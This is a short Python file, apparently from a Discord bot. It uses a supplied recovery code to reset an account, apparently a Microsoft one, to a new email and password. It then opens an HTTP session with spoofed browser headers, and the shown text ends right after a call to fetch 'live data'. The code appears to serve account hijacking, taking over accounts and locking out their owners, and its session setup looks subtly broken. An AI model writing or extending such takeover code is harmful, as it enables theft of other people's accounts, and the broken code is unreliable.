from discord import Embed
import httpx

from views.utils.securing.getLiveData import getLiveData
from views.utils.securing.recovery import recover
from views.utils.getMSAAUTH import getMSAAUTH

async def recoveryCodeFullSecure(email: str, recoveryCode: str, new_email: str, new_password: str, email_token: str) -> Embed | None:

    # Semi secure
    newRecv = await recover(
        email,
        recoveryCode,
        new_email,
        new_password,
        email_token
    )

    if not newRecv:
        return None
    
    session = httpx.AsyncClient(
        timeout = None,
        headers = {
            httpx.Headers(
                {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1"
                }
            )
        }
    )
    
    liveData = getLiveData(session)
